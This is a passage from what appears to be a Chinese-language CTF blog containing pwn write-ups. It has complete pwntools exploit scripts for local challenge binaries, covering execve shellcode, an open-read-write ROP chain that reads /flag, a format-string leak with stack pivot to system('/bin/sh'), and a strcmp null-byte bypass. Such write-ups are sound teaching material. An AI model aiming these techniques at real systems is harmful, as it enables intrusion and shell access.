+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0x3b		;	设置系统调用号，0x3b对应execve(al为rax的字节型)</span><br><span class="line">mov	esi, edi		;	将edi赋给esi，此时edi=esi=0</span><br><span class="line">mov	edi, 0x40201d	;	将0x40201d赋给edi，此时edi=0x40201d(/bin/sh的地址)</span><br><span class="line">mov edx, esi		;	将esi赋给edx，此时esi=0</span><br><span class="line">syscall				;	调用syscall</span><br><span class="line">;	syscall([al]0x3b)-&gt;execve([rdi]0x40201d, [rsi]NULL, [rds]NULL)</span><br></pre></td></tr></table></figure>
+
+<p>因此实现了shellcode的写入。但是执行之后没法getshell，继续调试看看</p>
+<h4 id="补充细节"><a href="#补充细节" class="headerlink" title="补充细节"></a><strong>补充细节</strong></h4><p><img src="/./images/image-20250204151131205.png" alt="image-20250204151131205"></p>
+<p>这里是执行<code>leave_ret</code>的ret前，可以看到rsp是指向<code>0x4040a8</code>的，但我们的汇编码写在了rsi指向的<code>00404098</code>处，这样的话不论怎么执行，命令指针永远不会指向我们的汇编码那里，所以还需要对rsp进行操作</p>
+<p>发现还有一个叫reg的函数，看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">17</span>h</span><br><span class="line">jmp     rsp</span><br></pre></td></tr></table></figure>
+
+<p><em>省流：让rsp指向rbp减0x17处</em></p>
+<p>那么执行这个之后rsp指向了：<code>[rbp]0x4040b0 - 0x17 = 0x404099</code>,很接近了，那么可以填充一个空指令<code>nop</code>让shellcode的开始位置就在0x404099</p>
+<p>执行以下<code>reg函数</code>之后，确实和我们计算的一样，<code>rsp</code>指向了0x404099</p>
+<p><img src="/./images/image-20250204152000363.png" alt="image-20250204152000363"></p>
+<p>接下来再调试一下shellcode</p>
+<p><img src="/./images/image-20250204152406421.png" alt="image-20250204152406421"></p>
+<p><em>这里多填充两个空指令，对齐栈</em></p>
+<p><strong>运行一下，over</strong></p>
+<p><img src="/./images/image-20250204152649263.png" alt="image-20250204152649263"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/NPCCTF/wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/NPCCTF/wp/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-24 17:13:15" itemprop="dateModified" datetime="2025-03-24T17:13:15+08:00">2025-03-24</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Ooorw"><a href="#Ooorw" class="headerlink" title="Ooorw"></a>Ooorw</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">51314</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc.address = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc.address</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc.address</span><br><span class="line">rdx_rbx = <span class="number">0x00000000000904a9</span>+libc.address</span><br><span class="line">rax = <span class="number">0x0000000000045eb0</span>+libc.address</span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">syscall = libc.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x403500</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(bss)</span><br><span class="line">payload+=p64(rdx_rbx)+p64(<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(rsi)+p64(bss)</span><br><span class="line">payload+=p64(rdx_rbx)+p64(<span class="number">0x0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(rsi)+p64(bss)</span><br><span class="line">payload+=p64(rdx_rbx)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">payload+=p64(rdi)+p64(bss)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/NPCCTF/ezstack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/NPCCTF/ezstack/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-26 12:36:40" itemprop="dateModified" datetime="2025-03-26T12:36:40+08:00">2025-03-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;wsl&#x27;</span>]</span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">62544</span>)</span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span></span><br><span class="line"><span class="comment">#                b vul</span></span><br><span class="line"><span class="comment">#                b *(0x401254)</span></span><br><span class="line"><span class="comment">#                b *(0x401268)</span></span><br><span class="line"><span class="comment">#                &quot;&quot;&quot;)</span></span><br><span class="line"><span class="comment"># io = remote(&quot;localhost&quot;, 5621)</span></span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x40127f</span></span><br><span class="line">pop_rdi = <span class="number">0x401203</span></span><br><span class="line">push_rbp_pop_rdi = <span class="number">0x4011FF</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop_rbp = <span class="number">0x401206</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">restart = <span class="number">0x401268</span>	<span class="comment"># read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span> ,<span class="string">b&quot;%22$pkkk&quot;</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;stack &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br><span class="line">target = stack - <span class="number">0xb8</span></span><br><span class="line">log.success(<span class="string">f&quot;target &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(target)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(target+<span class="number">0x30</span>) +p64(restart)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(target-<span class="number">0x58</span>) + p64(leave)<span class="comment"># retto target-0x50</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;ing?\n&quot;</span>, payload1.ljust(<span class="number">0x80</span>,<span class="string">b&quot;A&quot;</span>) + p64(target) + p64(leave))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_addr &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#libc.address = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment">#system_addr = libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line">payload2 = p64(ret)+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span> ,<span class="string">b&quot;%22$pkkk&quot;</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里格式化字符串漏洞泄露的偏移量是6</p>
+<p>![](.&#x2F;image&#x2F;屏幕截图 2025-03-25 205347-1742908098739-8.png)</p>
+<p>这里可以用6+0x80&#x2F;8&#x3D;22来泄露<code>rbp</code>指向的地址，<strong>这样泄露的栈地址最为稳妥</strong></p>
+<p>0x78的填充可以省去，没有必要</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = stack - <span class="number">0xb8</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是调试出来的，发现<code>rsp</code>是<code>rbp-0xb8</code></p>
+<p>![](.&#x2F;image&#x2F;屏幕截图 2025-03-25 210639-1742908098739-9.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(target+<span class="number">0x30</span>) +p64(restart)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(target-<span class="number">0x58</span>) + p64(leave)<span class="comment"># retto target-0x50</span></span><br></pre></td></tr></table></figure>
+
+<p>这里重复利用puts，将puts的地址泄露，<code>target+0x30</code>控制二次读取时的栈位置（给后面留空间，8*6&#x3D;0x30）</p>
+<p><code>pop_rbp</code>防止被迁移到.text段,如下图，如果没有<code>pop_rbp</code>将<code>rbp</code>的值弹出，<code>rbp</code>就变成了<code>0x40127</code></p>
+<p>![](.&#x2F;image&#x2F;屏幕截图 2025-03-25 211928.png)</p>
+<p>后面就正常了</p>
+<h2 id="多次泄露一次满足"><a href="#多次泄露一次满足" class="headerlink" title="多次泄露一次满足"></a>多次泄露一次满足</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;wsl&#x27;</span>]</span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span></span><br><span class="line"><span class="comment">#                b vul</span></span><br><span class="line"><span class="comment">#                b *(0x401254)</span></span><br><span class="line"><span class="comment">#                b *(0x401268)</span></span><br><span class="line"><span class="comment">#                &quot;&quot;&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">2280</span>)</span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x40127f</span></span><br><span class="line">pop_rdi = <span class="number">0x401203</span></span><br><span class="line">push_rbp_pop_rdi = <span class="number">0x4011FF</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop_rbp = <span class="number">0x401206</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">restart = <span class="number">0x401268</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;What&#x27;s your name?\n&quot;</span> ,<span class="string">b&quot;%22$p|%8$sAAAAAA&quot;</span>+p64(puts_got))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;stack &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br><span class="line">target = stack - <span class="number">0xb8</span></span><br><span class="line">log.success(<span class="string">f&quot;target &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(target)&#125;</span>&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_addr &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc = finder(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload1 = p64(pop_rbp) + p64(stack) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.sendafter(<span class="string">&quot;ing?\n&quot;</span>, payload1.ljust(<span class="number">0x80</span>,<span class="string">b&quot;A&quot;</span>) + p64(target) + p64(leave))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># libc.address = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># system_addr = libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/Pwn_it_off/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/Pwn_it_off/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-26 22:36:17" itemprop="dateModified" datetime="2025-02-26T22:36:17+08:00">2025-02-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="moectf-Pwn-it-off"><a href="#moectf-Pwn-it-off" class="headerlink" title="moectf Pwn_it_off"></a>moectf Pwn_it_off</h1><p>by Maple</p>
+<p><em><strong>你真的理解栈了吗</strong></em></p>
+<p>先介绍两个知识点</p>
+<ul>
+<li>函数局部变量在函数返回时不会被清空，而是留在调用栈上原位置；函数调用时程序也不会主动清空先前同调用层级的函数残留的局部变量。</li>
+<li><code>strcmp</code> 比对字符串，C 语言用 <code>&#39;\x00&#39;</code> 标志字符串末尾，同时 <code>strcmp</code> 字符串比对也会到此终止，从而绕过检查。</li>
+</ul>
+<p>ida里查看各个函数，可以发现在<code>down</code>函数的功能是输出<code>flag</code>内容，但是在主函数中这个函数在<code>voice_pwd</code>和<code>num_pwd</code>之后，所以我们要想办法把这两个函数成功过掉</p>
+<p>因为刚开始执行的那3个函数都没有参数调用，并且都是<code>main</code>函数的调用，所以这三个函数的栈底应该是一样的，也就是说之前函数执行留下的数据会被留在下一个函数的对应位置，如图</p>
+<img src="./images/d7e2c49ea284c357baab9a75bd83b9d9_720.jpg" alt="d7e2c49ea284c357baab9a75bd83b9d9_720" style="zoom: 67%;" />
+
+<p>觉得这张图应该很清楚了，不会的话来捶我</p>
+<p>接下来是小细节，写在exp里了</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">64393</span>)</span><br><span class="line">last_line = <span class="built_in">bytes</span>()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    line = p.recv()	<span class="comment"># 持续接受数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;[Error]&#x27;</span> <span class="keyword">in</span> line:	<span class="comment"># 遇到[Error]时停止接受</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    last_line = line	<span class="comment"># 记录最后一行的数据</span></span><br><span class="line"></span><br><span class="line">password = last_line[<span class="number">28</span>:<span class="number">28</span>+<span class="number">15</span>]	<span class="comment"># 字节序列的28开始往后顺15个截留下来</span></span><br><span class="line">p.send(password+<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">12345</span>)[<span class="number">0</span>:<span class="number">7</span>])	<span class="comment"># 在第16位截断，后面不比较了就，接着塞进去一个5位数切成7字节，留给v1[1]</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;12345&#x27;</span>)	<span class="comment"># 输入v1[0]就好</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/moectf/prerandom/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Maple">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Maple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Maple">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/04/04/moectf/prerandom/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-04 01:34:37" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:37+08:00">2025-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
